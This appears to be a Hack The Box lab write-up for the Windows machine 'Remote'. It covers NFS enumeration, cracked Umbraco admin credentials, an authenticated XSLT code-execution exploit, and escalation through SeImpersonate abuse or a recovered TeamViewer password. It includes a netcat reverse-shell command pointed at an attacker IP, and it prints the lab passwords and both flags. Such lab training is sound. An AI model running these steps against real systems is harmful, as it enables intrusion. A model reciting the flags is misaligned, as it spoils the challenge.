```json
Alias: Remote
Date: 17-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.129.230.172
```

# Remote
# Summary

- Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using `psexec` with these credentials returns a SYSTEM shell.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-17 05:44 PKT
Nmap scan report for 10.129.230.172
Host is up (0.22s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open     rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
2049/tcp  open     nlockmgr      1-4 (RPC #100021)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49159/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-17T01:48:09
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 267.82 seconds
```

---
# Enumeration

We see that [[Network File System (NFS)]] Is running on the target, we can see mountable shares with

`showmount -e $IP`

and then mount using
```bash
mount -t nfs $IP:/site_backups mnt_site_backups -o nolock
```

Looking for connectionStrings in the Web.Config we see that the SQL CE database file is stored at `App_Data\Umbraco.sdf` If we use strings on it and grep for "admin" we will come across a SHA-1 Hash, cracking that will give us

| Username        | Password       |
| --------------- | -------------- |
| admin@htb.local | baconandcheese |

---

# Exploitation

This version of Umbraco is vulnerable to an Authenticated RCE, The `/umbraco/developer/Xslt/xsltVisualize.aspx` xsltVisualize takes in an XML Style sheet to  visualize it but it is possible to get it to execute code using the tag 
`<msxsl:script language="C#" implements-prefix="csharp_user">`. This [script](https://github.com/Jonoans/Umbraco-RCE) Helps us to do exactly that.

---
# Privilege Escalation

Now that we have a shell, doing a whoami shows that we have `seImpersonatePrivilege` and `SeAssingPrimaryPrivilege` Privileges.

I used [mimic](https://github.com/raysh454/mimic), a tool I wrote by reading it4man's blog about abusing these privileges because I was bored. You can use the original [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) as well.

We can get a shell by setting up a listener and doing
`./mimic.exe C:\Users\Public\nc.exe 10.10.14.188 4444 -e powershell`

### Alternative Way
After reading the summary it seems that the intended way to Admin is different, Apparently there is a vulnerable version of TeamViewer running on the target that stores the password in memory. 
More [here](https://github.com/vah13/extractTVpasswords).

We can use the program provided above but if like me you also don't have access to a windows machine to compile it, we can also use the teamviewer_passwords module from metasploit. Switch the reverse shell and run the exploit to get following:

| Username      | Password |
| ------------- | -------- |
| Administrator | !R3m0te! |

We can now use PSExec to connect.

---

# Flags
- e8172f385500017c4df377bf646850c1
- 0c594ac95048f8caee6404f635351a65

#CTF #CTF/Hackthebox #CTF/Hackthebox/Easy #Windows #Windows/SeImpersonate #TeamViewer #WebApp #WebApp/Umbraco